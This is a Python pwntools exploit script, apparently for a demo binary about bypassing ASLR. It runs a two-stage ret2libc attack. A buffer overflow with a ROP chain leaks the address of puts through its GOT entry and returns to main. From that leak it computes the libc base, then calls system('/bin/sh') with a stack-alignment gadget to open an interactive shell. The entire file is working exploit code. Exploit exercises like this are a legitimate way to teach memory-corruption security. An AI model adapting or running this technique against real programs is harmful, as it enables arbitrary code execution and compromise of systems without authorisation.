from pwn import *

path = './03_demo_ASLR'
elf = ELF(path)
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-h']
context.update(binary=elf)

r = process(path)
if "debug" in sys.argv:
    gdb.attach(r.pid,"break main\ncontinue")

offset = 40
pop_rdi = 0x400673
ret = 0x400451

r.readline()

#-- Step 1: Leak the address of puts via its GOT entry
r.sendline(flat(
    "A" * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main'], # We redirect to main to restart the execution without reloading ASLR
))

output = r.recvline()
leak = output[0x2a:0x2a+6]
leak = leak.ljust(8, '\x00')
leaked_address = u64(leak)

# In some case, the exploit fails (probably because the libc address contains bad bytes)
if not hex(leaked_address).startswith('0x7f'):
    log.error('exploit failed')
    
log.info('puts @ %#x' % leaked_address)

libc.address = leaked_address - 0x809c0
log.success('libc @ %#x' % libc.address)

bin_sh = next(libc.search('/bin/sh\x00'))
log.info('"/bin/sh" @ %#x' % bin_sh)

r.recvline()

#-- Step 2: we're in main again, and we now have the address of libc. We can just ROP our way to system
r.sendline(flat(
    "A" * offset,
    pop_rdi,
    bin_sh,
    ret, # Needed to align the stack to 16 bytes (otherwise the exploit crashed with the libc shipped on Ubuntu 18.04)
    libc.symbols['system']
))

r.clean()
r.interactive()